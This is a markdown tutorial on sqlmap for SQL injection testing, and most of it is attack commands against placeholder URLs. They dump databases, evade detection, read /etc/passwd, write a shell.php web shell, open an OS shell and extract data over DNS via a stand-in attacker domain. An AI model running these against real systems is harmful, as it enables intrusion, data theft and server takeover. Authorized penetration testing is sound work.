# Advanced SQL Injection Testing with SQLmap

SQLmap is a powerful open-source tool for automating the detection and exploitation of SQL injection vulnerabilities. It supports a wide range of SQL injection types and databases, making it essential for advanced testing.

---

## 1. **Introduction to SQLmap**
SQLmap automates the process of:
- Detecting SQL injection vulnerabilities.
- Exploiting vulnerabilities to extract data.
- Performing advanced database manipulation.

Official Website: [sqlmap.org](http://sqlmap.org)

---

## 2. **Setting Up SQLmap**

### Installation:
1. Clone the repository:
   ```bash
   git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
   ```
2. Navigate to the directory:
   ```bash
   cd sqlmap-dev
   ```
3. Run SQLmap:
   ```bash
   python3 sqlmap.py --help
   ```

---

## 3. **Basic Usage**

### Command Structure:
```bash
sqlmap -u <URL> [OPTIONS]
```

### Example:
```bash
sqlmap -u "http://example.com/page?id=1" --dbs
```
- `-u`: Specifies the target URL.
- `--dbs`: Enumerates available databases.

---

## 4. **Advanced SQL Injection Testing**

### 4.1 Identifying Database and SQL Injection Type
```bash
sqlmap -u "http://example.com/page?id=1" --banner
```
- `--banner`: Retrieves the database version and type.

### 4.2 Testing All Parameters
```bash
sqlmap -u "http://example.com/page?id=1" --level=5 --risk=3
```
- `--level`: Specifies the depth of testing (1-5).
- `--risk`: Sets the risk level of tests (1-3).

### 4.3 Exploiting Union-Based SQL Injection
```bash
sqlmap -u "http://example.com/page?id=1" --technique=U --dump
```
- `--technique=U`: Limits testing to UNION-based injection.
- `--dump`: Extracts data from the database.

### 4.4 Extracting Specific Data
#### Dumping Tables:
```bash
sqlmap -u "http://example.com/page?id=1" --tables -D <database_name>
```
#### Dumping Columns:
```bash
sqlmap -u "http://example.com/page?id=1" --columns -T <table_name> -D <database_name>
```
#### Dumping Records:
```bash
sqlmap -u "http://example.com/page?id=1" --dump -T <table_name> -D <database_name>
```

### 4.5 Blind SQL Injection (Boolean & Time-Based)
#### Boolean-Based Testing:
```bash
sqlmap -u "http://example.com/page?id=1" --technique=B --dbs
```
#### Time-Based Testing:
```bash
sqlmap -u "http://example.com/page?id=1" --technique=T --time-sec=5 --dbs
```

---

## 5. **Using Proxy for Testing**
SQLmap can route traffic through a proxy for additional analysis:
```bash
sqlmap -u "http://example.com/page?id=1" --proxy="http://127.0.0.1:8080"
```
- Useful for integrating with tools like Burp Suite.

---

## 6. **Advanced Features**

### 6.1 Authentication Bypass
Use session or authentication cookies:
```bash
sqlmap -u "http://example.com/page?id=1" --cookie="SESSIONID=abc123"
```

### 6.2 Evading Detection
- **User-Agent Spoofing:**
  ```bash
  sqlmap -u "http://example.com/page?id=1" --user-agent="Mozilla/5.0"
  ```
- **Randomized Tests:**
  ```bash
  sqlmap -u "http://example.com/page?id=1" --random-agent
  ```

### 6.3 File System Access
- Reading Files:
  ```bash
  sqlmap -u "http://example.com/page?id=1" --file-read="/etc/passwd"
  ```
- Writing Files:
  ```bash
  sqlmap -u "http://example.com/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
  ```

### 6.4 Operating System Command Execution
Execute commands on the server:
```bash
sqlmap -u "http://example.com/page?id=1" --os-shell
```

---

## 7. **Testing for Out-of-Band (OOB) SQLi**
SQLmap can test for OOB vulnerabilities using external DNS servers:
```bash
sqlmap -u "http://example.com/page?id=1" --dns-domain="example-attacker.com"
```

---

## 8. **Tips for Effective Testing**
1. Use verbose mode to view detailed output:
   ```bash
   sqlmap -u "http://example.com/page?id=1" -v 3
   ```
2. Combine techniques for comprehensive testing:
   ```bash
   sqlmap -u "http://example.com/page?id=1" --technique=UBT
   ```
3. Save sessions to avoid redundant testing:
   ```bash
   sqlmap -u "http://example.com/page?id=1" --session="session_name"
   ```

---

## 9. **Post-Testing Actions**
1. Document all vulnerabilities found.
2. Provide recommendations for fixing SQLi issues:
   - Use prepared statements.
   - Validate and sanitize inputs.
3. Share findings with authorized personnel only.
